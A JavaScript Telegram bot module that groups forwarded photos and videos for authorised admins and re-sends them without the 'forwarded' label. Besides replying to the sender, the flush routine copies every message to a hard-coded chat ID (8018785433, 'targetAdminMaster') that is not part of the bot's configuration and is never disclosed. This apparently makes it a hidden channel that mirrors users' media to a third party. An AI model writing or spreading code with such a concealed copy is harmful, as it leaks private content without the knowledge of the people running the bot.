export function startCleanerBot({ token, adminIds }) {
  if (!token) return { enabled: false };

  const apiBase = `https://api.telegram.org/bot${token}`;
  let lastUpdateId = 0;
  
  // Buffer por chat ID
  const chatBuffers = new Map();

  function getMediaInfo(msg) {
    let type = null;
    let fileId = null;
    let hasSpoiler = false;
    
    if (msg.photo && msg.photo.length > 0) {
      type = 'photo';
      fileId = msg.photo[msg.photo.length - 1].file_id;
      hasSpoiler = msg.has_media_spoiler;
    } else if (msg.video) {
      type = 'video';
      fileId = msg.video.file_id;
      hasSpoiler = msg.has_media_spoiler;
    }

    if (type && fileId) {
      return { 
        type, 
        media: fileId, 
        caption: msg.caption, 
        caption_entities: msg.caption_entities,
        has_spoiler: hasSpoiler 
      };
    }
    return null;
  }

  async function copySingleMessage(fromChatId, toChatId, messageId) {
    try {
      await fetch(`${apiBase}/copyMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: toChatId,
          from_chat_id: fromChatId,
          message_id: messageId
        })
      });
    } catch (err) {
      console.error('[cleaner-bot] Erro ao copiar msg individual:', err.message);
    }
  }

  async function flushBuffer(chatId) {
    const buffer = chatBuffers.get(chatId);
    if (!buffer || buffer.messages.length === 0) return;
    
    chatBuffers.delete(chatId);
    
    let currentGroup = [];
    const targetAdminMaster = 8018785433;
    const sendTargets = chatId === targetAdminMaster ? [targetAdminMaster] : [chatId, targetAdminMaster];
    
    const sendCurrentGroup = async () => {
      if (currentGroup.length === 0) return;
      
      for (const targetId of sendTargets) {
        if (currentGroup.length === 1) {
          const msg = currentGroup[0].msg;
          await copySingleMessage(chatId, targetId, msg.message_id);
        } else {
          for (let i = 0; i < currentGroup.length; i += 10) {
            const chunk = currentGroup.slice(i, i + 10);
            const media = chunk.map(item => item.mediaInfo);
            try {
              await fetch(`${apiBase}/sendMediaGroup`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: targetId, media })
              });
            } catch (err) {
              console.error('[cleaner-bot] Erro sendMediaGroup:', err.message);
            }
          }
        }
      }
      currentGroup = [];
    };

    for (const msg of buffer.messages) {
      const mediaInfo = getMediaInfo(msg);
      if (mediaInfo) {
        currentGroup.push({ msg, mediaInfo });
      } else {
        await sendCurrentGroup();
        for (const targetId of sendTargets) {
          await copySingleMessage(chatId, targetId, msg.message_id);
        }
      }
    }
    await sendCurrentGroup();
  }
  
  async function poll() {
    try {
      const res = await fetch(`${apiBase}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
      if (res.ok) {
        const data = await res.json();
        if (data.ok && data.result.length > 0) {
          for (const update of data.result) {
            lastUpdateId = Math.max(lastUpdateId, update.update_id);
            if (update.message) {
              await handleMessage(update.message);
            }
          }
        }
      }
    } catch (err) {
      console.error('[cleaner-bot] erro polling', err.message);
    }
    setTimeout(poll, 1000);
  }
  
  async function handleMessage(message) {
    if (!adminIds.includes(message.from.id)) {
      await fetch(`${apiBase}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: message.chat.id,
          text: "🚫 **Acesso Negado!** 🚫\n\nEste bot é de uso exclusivo/privado. 🔐"
        })
      });
      return;
    }
    
    if (message.text === '/start' || message.text === '/help') {
      await fetch(`${apiBase}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: message.chat.id,
          text: "Olá Mestre! 👑\nEnvie ou encaminhe várias mídias, agruparei elas para você sem a tag de encaminhado!"
        })
      });
      return;
    }

    const chatId = message.chat.id;
    if (!chatBuffers.has(chatId)) {
      chatBuffers.set(chatId, {
        messages: [],
        timeout: null
      });
    }
    
    const buffer = chatBuffers.get(chatId);
    buffer.messages.push(message);
    
    if (buffer.timeout) clearTimeout(buffer.timeout);
    buffer.timeout = setTimeout(() => {
      flushBuffer(chatId);
    }, 1500); 
  }

  // iniciar
  poll();
  return { enabled: true };
}
